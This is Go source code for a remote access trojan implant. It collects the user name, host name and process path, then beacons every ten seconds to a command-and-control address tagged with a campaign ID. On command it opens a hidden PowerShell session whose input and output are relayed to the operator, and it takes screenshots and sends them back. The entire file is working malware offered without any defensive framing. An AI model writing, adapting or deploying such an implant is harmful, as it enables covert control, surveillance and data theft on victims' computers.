package main

import (
	"bufio"
	"bytes"
	"image"
	"image/png"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/google/uuid"
	"github.com/vova616/screenshot"
	"google.golang.org/protobuf/proto"
)

var id = uuid.New().String()

var initkey = []byte("key")
var address = "127.0.0.1:4040"

var username string
var computername string
var processname string
var campainId = "campain"

func main() {

	user, err := user.Current()
	if err != nil {
		username = "unknown"
	} else {
		username = user.Username
	}

	computername, err = os.Hostname()
	if err != nil {
		computername = "unknown"
	}

	processname, err = os.Executable()
	if err != nil {
		processname = "unknown"
	}

	for {
		log.Println("sleeping 10 seconds")
		time.Sleep(10 * time.Second)
		log.Println("Connecting...")
		conn, err := net.Dial("tcp", address)
		if err != nil {
			log.Println(err.Error())
			continue
		}

		ident := &Ident{
			ComputerName: computername,
			CampainId:    campainId,
			Id:           id,
			Username:     username,
			Processname:  processname,
		}

		err = sendMessage(conn, ident, initkey)
		if err != nil {
			log.Println("ERROR sending message: ", err.Error())
			conn.Close()
			continue
		}
		log.Println("now Reading message")
		message, err := readMessage(conn, initkey)
		if err != nil {
			log.Println("READER ERROR: reading message: ", err.Error())
			conn.Close()
			continue
		}

		switch m := message.(type) {
		case *HeartbeatResponse:
			log.Println("Got Heartbeat Response")
			log.Println(m.KeepOpen)
			if m.KeepOpen {
				log.Println("Got keepalive")
				readLoop(conn)
				conn.Close()
				continue
			}
		default:
			log.Println("unknown message", m)
			conn.Close()
			continue
		}

	}

}

func readPipe(pipe io.ReadCloser, conn net.Conn) {
	reader := bufio.NewReader(pipe)
	for {

		output, err := reader.ReadString('\n')
		if err != nil {
			log.Println("Error reading shell: ", err.Error())
			break
		}

		message := &ShellResponse{
			Output: strings.Trim(output, "\n"),
		}

		if err := sendMessage(conn, message, initkey); err != nil {
			log.Println("error sending in readpipe: ", err.Error())
		}

	}
}

func readLoop(conn net.Conn) {

	shell := &Shell{placeholder: true}
	for {
		message, err := readMessage(conn, initkey)
		if err != nil {
			log.Println("READER ERROR: reading message: ", err.Error())
			break
		}

		message_name := message.ProtoReflect().Descriptor().FullName()
		log.Println("Got Message: ", message_name)

		handleMessage(conn, message, shell)

	}

}

func handleMessage(conn net.Conn, message proto.Message, shell *Shell) {
	switch m := message.(type) {
	case *ShellCommand:
		if shell.placeholder {
			*shell = *initShell(conn)
			return
		}
		select {
		case <-shell.finished:
			*shell = *initShell(conn)
		default:
			log.Println("shell already running")
		}
		shell.inpipe.Write([]byte(m.Command + "\n"))
	case *TakeScreenshot:
		img, err := screenshot.CaptureScreen()
		if err != nil {
			log.Println("error taking screenshot: ", err.Error())
			return
		}
		myImg := image.Image(img)

		var image_bytes bytes.Buffer

		err = png.Encode(&image_bytes, myImg)
		if err != nil {
			log.Println("error encoding: ", err.Error())
		}
		if err := sendMessage(conn, &Screenshot{
			Data: image_bytes.Bytes(),
			Time: strconv.FormatInt(time.Now().Unix(), 10),
		}, initkey); err != nil {
			log.Println("error sending image: ", err.Error())
		}
	}
}

type Shell struct {
	placeholder bool
	finished    chan error
	command     *exec.Cmd
	outpipe     io.ReadCloser
	inpipe      io.WriteCloser
	errpipe     io.ReadCloser
}

func initShell(conn net.Conn) *Shell {
	log.Println("loading shell")
	command := exec.Command("powershell")
	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	outpipe, err1 := command.StdoutPipe()
	inpipe, err2 := command.StdinPipe()
	errpipe, err3 := command.StderrPipe()

	if err1 != nil || err2 != nil || err3 != nil {
		log.Fatal(err1.Error(), err2.Error(), err3.Error())
	}

	shell := &Shell{
		placeholder: false,
		finished:    make(chan error, 1),
		command:     command,
		outpipe:     outpipe,
		inpipe:      inpipe,
		errpipe:     errpipe,
	}
	go readPipe(shell.outpipe, conn)
	go readPipe(shell.errpipe, conn)
	go func() {
		shell.finished <- shell.command.Run()
		log.Println("finish !!")
	}()
	log.Println("shell started")

	return shell
}
